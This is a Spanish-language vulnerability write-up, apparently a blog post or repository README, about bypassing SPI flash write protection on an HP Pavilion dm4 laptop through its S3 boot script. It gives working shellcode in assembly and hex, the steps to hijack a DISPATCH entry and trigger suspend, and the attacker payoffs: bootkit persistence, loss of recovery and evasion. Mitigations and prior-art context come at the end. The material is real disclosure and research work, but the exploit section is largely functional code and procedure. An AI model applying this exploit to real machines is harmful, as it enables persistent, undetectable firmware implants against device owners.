# Saltear la protección de escritura del SPI flash con el boot script de S3

**HP Pavilion dm4-3000 series (placa 1793). InsydeH2O, BIOS F.0C**

Todo esto es sobre mi propia notebook. Si tenés la misma, lo podés reproducir en tu casa.

---

## La versión corta

El firmware de HP aplica la protección de escritura del flash (el registro `PR0`) **después**
de replayear el boot script de S3. Y ese boot script vive en memoria ACPI NVS, que el sistema
operativo puede escribir sin drama. Encima tiene entradas `DISPATCH`, que saltan a ejecutar
código en DRAM que también podés escribir.

O sea que si sos root podés reapuntar una de esas entradas a código tuyo, suspender la máquina,
y ejecutar en el contexto de resume del firmware, justo en la ventana donde `PR0` vale cero y
`FLOCKDN` todavía no se cerró.

Y ahí está la posta: **`FLOCKDN` es un bit de una sola escritura**. Lo cerrás vos primero, con
los registros vacíos, y cuando el firmware quiere escribir `PR0` su escritura se va a la mierda
en silencio.

Resultado: **la región BIOS entera, boot block incluido, queda escribible** hasta el próximo
reset.

---

## La máquina

| | |
|:---|:---|
| Equipo | HP Pavilion dm4-3099se (dm4-3000 series) |
| Placa | `1793` |
| Firmware | InsydeH2O **F.0C** (2013-01-21), la última que sacó HP |
| SoftPaq | `sp60639.exe` |
| CPU / PCH | i7-2630QM (Sandy Bridge) / **HM67** (Cougar Point, serie 6) |
| SPI flash | Macronix MX25L32xx, 4 MB |

---

## Cómo estaba la cosa

Esto sale de leer directo los registros del controlador SPI
(`SPIBAR = RCBA + 0x3800 = 0xFED1F800`):

```
BIOS_CNTL (LPC 0xDC)    = 0x00     BIOSWE=0  BLE=0  SMM_BWP=0
HSFS      (SPIBAR+0x04) = 0xe008   FLOCKDN=1
PR0       (SPIBAR+0x74) = 0x83ff03a1   -> protege 0x3a1000-0x3fffff
FRAP      (SPIBAR+0x50) = 0x00000a0b
```

Y el layout del flash según FREG0-4:

| región | rango | podés leer | podés escribir |
|:---|:---|:---:|:---:|
| descriptor | `0x000000-0x000fff` | sí | no |
| ME | `0x001000-0x17ffff` | **no** | **no** |
| BIOS | `0x180000-0x3fffff` | sí | sí |

Tres cosas de acá que importan:

**`BLE = 0`.** HP nunca activó el lock por SMI. La escritura al flash no pasa por SMM, no hay
handler que te revierta el `BIOSWE`.

**`PR0` cubre `0x3a1000-0x3fffff`**, que es **exactamente** el firmware volume del boot block.
Lo verifiqué contra su cabecera `_FVH` en `0x3a1000` con longitud `0x5f000`. Ahí adentro vive
el reset vector (`0xFFFFFFF0` mapea al offset `0x3ffff0` del chip).

**Traducción:** sin saltar esto escribís `0x180000-0x3a0fff` y nada más. Alcanza para modificar
módulos del firmware de HP, no alcanza para reemplazarlo.

Ah, y un detalle que me causó gracia: el flasher de HP trae `[ForceFlash] BB_PEI=0` en su propio
`platform.ini`. Su actualizador tampoco toca el boot block. No es que no quiera, no puede.

---

## La vulnerabilidad

### Qué carajo es el boot script de S3

Cuando la máquina se suspende, el firmware UEFI deja grabada una tabla con todas las operaciones
que tiene que repetir al despertar, para dejar el chipset como estaba. En esta máquina:

```
donde  : 0xacf5e000 - 0xacf62ab5   (19125 bytes, 903 entradas)
en que : ACPI Non-volatile Storage (0xacebf000-0xacfbefff)
```

Los opcodes:

```
PCI_WRITE        477
MEM_WRITE        247
MEM_READ_WRITE   147
DISPATCH          25
IO_WRITE           5
TABLE              1
TERMINATE          1
```

**Esa tabla no está protegida contra escritura.** ACPI NVS es DRAM común, la abrís con
`/dev/mem` y listo.

### El primitivo: DISPATCH

El opcode `DISPATCH` (`0x08`) salta a ejecutar código en una dirección física de 64 bits que
está guardada **en la misma tabla**. Acá hay 25:

| a dónde apunta | cuántas | qué es |
|:---|---:|:---|
| `0xACEBC260` | 24 | DRAM marcada `Reserved`, **escribible desde el sistema** |
| `0xFFFAF998` | 1 | adentro del boot block en flash, protegida |

Las 24 apuntan a código x86 de 32 bits real:

```
0xACEBC260:  ff 74 24 08     push dword [esp+8]
             ff 74 24 08     push dword [esp+8]
             e8 1e 11 00 00  call ...
             59 59           pop ecx / pop ecx
             e9 bc 01 00 00  jmp  ...
```

### La ventana

Acá venía la pregunta del millón: ¿el firmware aplica las protecciones antes o después de correr
el boot script? Porque si es antes, todo esto no sirve para nada y me fui a dormir.

Así que en vez de adivinar lo medí. Instrumenté el resume con shellcode propio:

| | primer DISPATCH | último DISPATCH | corriendo normal |
|:---|:---|:---|:---|
| `HSFS` | `0x6008` | `0x6008` | `0xe008` |
| `PR0` | `0x00000000` | `0x00000000` | `0x83ff03a1` |

`0x6008` tiene el bit 15 (`FLOCKDN`) **en cero**.

**O sea: el firmware aplica `PR0` y `FLOCKDN` después de terminar el boot script.** Hay una
ventana donde podés ejecutar código con todo abierto de par en par.

### La jugada

Limpiar `PR0` desde la ventana no sirve, porque el firmware lo reescribe al final.

Pero `FLOCKDN` (bit 15 de `HSFS`) es **write-once**: una vez que lo ponés en 1 congela los
registros `PR0-PR4` hasta el próximo reset, no importa quién intente escribirlos después.

Entonces: **le cierro el candado yo primero, con `PR0` todavía en cero.** La escritura posterior
del firmware se descarta sola y ni se entera.

---

## Cómo se hace

### Paso 1: encontrar la tabla

Parseás ACPI NVS (la dirección sale de `/proc/iomem`, buscá `ACPI Non-volatile Storage`) hasta
encontrar una cadena coherente de opcodes. La cabecera es `EFI_BOOT_SCRIPT_TABLE` (`0xAA`) y
termina en `TERMINATE` (`0xFF`).

> **Dos cosas que me hicieron perder tiempo:**
>
> `mmap()` sobre `/dev/mem` te tira `EAGAIN` con `CONFIG_STRICT_DEVMEM`. Usá `read()`/`pread()`
> y chau.
>
> Y **no se te ocurra recorrer las regiones `Reserved` genéricas** de `/proc/iomem`. Ahí adentro
> hay MMIO y SMRAM, y con **leer** alcanza para tirarte la máquina. A mí me la reseteó en el
> acto y me comí un fsck de regalo. Leé solo rangos concretos que hayas verificado que son DRAM.

### Paso 2: el shellcode

32 bits, flat, 64 bytes. Lee `PR0`, cierra `FLOCKDN`, deja evidencia, y salta a la rutina
original para no romper el resume:

```asm
    push eax
    push edx
    mov  edx, 0xFED1F874        ; PR0
    mov  eax, [edx]
    mov  [RES+0], eax           ; PR0 antes
    mov  edx, 0xFED1F804        ; HSFS
    mov  ax,  0x8000            ; FLOCKDN
    mov  [edx], ax              ; <<< aca se cierra
    movzx eax, word [edx]
    mov  [RES+4], eax           ; HSFS despues
    mov  edx, 0xFED1F874
    mov  eax, [edx]
    mov  [RES+8], eax           ; PR0 despues
    mov  dword [RES+12], 0xC0FFEE03
    pop  edx
    pop  eax
    push 0xACEBC260             ; rutina original
    ret
```

```
5052ba74f8d1fe8b02a34060f6acba04f8d1fe66b800806689020fb702a344
60f6acba74f8d1fe8b02a34860f6acc7054c60f6ac03eeffc05a586860c2eb
acc3
```

### Paso 3: colgarlo del DISPATCH

**No pises la rutina de `0xACEBC260`.** La llaman 24 veces y si la rompés se te va todo el
resume al carajo. Lo que hacés es reapuntar el puntero de **una sola** entrada `DISPATCH` (está
en el offset `+3` de la entrada) hacia tu shellcode, que va en un área libre de ACPI NVS.

Yo usé la última entrada, para que el firmware ya haya terminado toda su configuración del SPI
antes de que le cierre el candado. El shellcode salta a la rutina original al terminar, así que
las otras 24 llamadas ni se enteran de nada.

### Paso 4: mandarle

```bash
rtcwake -m mem -s 20
```

Y a esperar los 20 segundos más largos de tu vida. Te soy sincero: se me paró el corazón. Si
salía mal, adiós resume, y ahí sí me tocaba agarrar la pinza y ponerme a hacer hardware hacking,
que era exactamente lo que estaba tratando de evitar jajaja.

---

## Que anduvo, no es verso

Lo que dejó el shellcode en memoria, en `0xacf66040`:

```
00000000: 0000 0000 08e0 0000 0000 0000 03ee ffc0
          ^^^^^^^^^ ^^^^^^^^^ ^^^^^^^^^ ^^^^^^^^^
          PR0 antes HSFS desp PR0 desp  la marca
          0x0       0xe008    0x0       0xC0FFEE03
```

Y desde el sistema, antes y después:

```
antes del suspend:  HSFS = 0xe008   PR0 = 0x83ff03a1   (0x3a1000-0x3fffff protegido)
despues del resume: HSFS = 0xe008   PR0 = 0x00000000   (nada protegido)
```

Y flashrom, que no tiene nada que ver conmigo y lo confirma solo:

```
antes:   PR0: Warning: 0x003a1000-0x003fffff is read-only.
         FREG1: BIOS region (0x00180000-0x003fffff) is read-write.

despues: (la advertencia de PR0 desaparecio)
         FREG1: BIOS region (0x00180000-0x003fffff) is read-write.
```

La máquina resume normal, no se cuelga, no hace nada raro. Boot block liberado.

---

## Para qué sirve esto

Si ya tenés **ring 0** (root con `/dev/mem`, o un driver de kernel), esto te lo convierte en
**persistencia a nivel firmware**:

- **Escribís el boot block**, reset vector incluido. Podés meter un bootkit que arranca antes que
  cualquier cosa del sistema operativo.
- **Sobrevive a todo**: reinstalás, formateás, cambiás el disco, y sigue ahí. Solo se limpia
  reflasheando el chip por hardware.
- **Te quedás sin recovery**: el crisis recovery de Insyde vive en el mismo boot block que el
  atacante pisa.
- **No se ve**: cualquier herramienta que corra sobre el sistema operativo está por debajo del
  implante.

Y no hace falta acceso físico ni desarmar nada. Alcanza con una suspensión a RAM, que la podés
provocar o esperar a que el tipo cierre la tapa.

### Lo que NO te da

- **No te abre el ME.** Los permisos de esa región salen del flash descriptor (`FRAP`/`FLMSTR`),
  que el hardware repuebla en cada arranque. Ningún resume los cambia. Para tocar el ME sí o sí
  necesitás un programador SPI externo.
- **No sobrevive a un arranque en frío.** El boot script se reconstruye en cada boot, así que hay
  que repetirlo. Igual, para plantar un implante persistente con correrlo una vez alcanza.
- **No eleva privilegios.** Ya arrancás desde ring 0.

---

## ¿Esto es nuevo? Na

La clase de bug no es nueva. Es el ataque al boot script de S3 que publicaron Rafal Wojtczuk y
Corey Kallenberg en 2015 ("Attacks on UEFI Security"), que en su momento generó advisories de
CERT/CC y de varios fabricantes. Lo de cerrar `FLOCKDN` con los `PR` vacíos también es parte del
repertorio conocido de esa familia.

Lo que aporto acá es un caso concreto, medido y sin parchear en un modelo puntual, con PoC que
anda y confirmado por una herramienta que no es mía.

**Para CVE las chances son bajas**, y lo digo yo antes de que me lo digan:

1. La clase está documentada desde 2015 y ya tiene identificadores asignados.
2. El producto está muerto. El firmware es de 2013 y es la última versión que sacó HP, no van a
   parchear un carajo.
3. Arrancás desde ring 0, lo que baja la puntuación en varios esquemas. Aunque, seamos justos,
   el cruce de frontera es real: las protecciones del SPI existen justamente para que ring 0 no
   llegue al firmware.

**Lo que sí puede ser juicy** es si el mismo patrón está en toda la familia de HP de consumo con
InsydeH2O de esa generación. Ahí ya no es una notebook vieja, es un defecto de plataforma que se
comió un montón de equipos. Pero eso hay que confirmarlo en varios modelos, y yo tengo uno. O no
:P?

---

## Cómo se arregla

Si sos el fabricante:

1. **Aplicá `PR0` y `FLOCKDN` antes de replayear el boot script**, desde el código de resume del
   boot block protegido. Esto solo ya mata el ataque.
2. **Protegé la tabla del boot script**, o al menos validá su integridad antes de ejecutarla.
3. **Activá `BLE` y `SMM_BWP`**, que en este sistema están los dos en cero.
4. Sacá las entradas `DISPATCH` que saltan a DRAM sin proteger, o verificá el código antes de
   saltar.

Si sos el usuario de una máquina afectada y sabés que no va a haber parche nunca:

- Deshabilitar S3 y usar S4 (hibernación) te saca el vector de encima.
- Y si querés estar seguro de verdad, la única es verificar el firmware cada tanto con un lector
  SPI externo.

---

## Los archivos

```
tools/exploit_auto.py     el exploit, localiza todo solo
tools/spi_check.py        lee las protecciones del SPI
tools/bs2.py              parser del boot script
```

Los dumps del flash y el DSDT no van en el repo porque tienen el serial, el UUID y la MAC de mi
máquina. Si querés reproducirlo, los sacás de la tuya con `flashrom` y `acpidump`, que igual es
lo que corresponde.
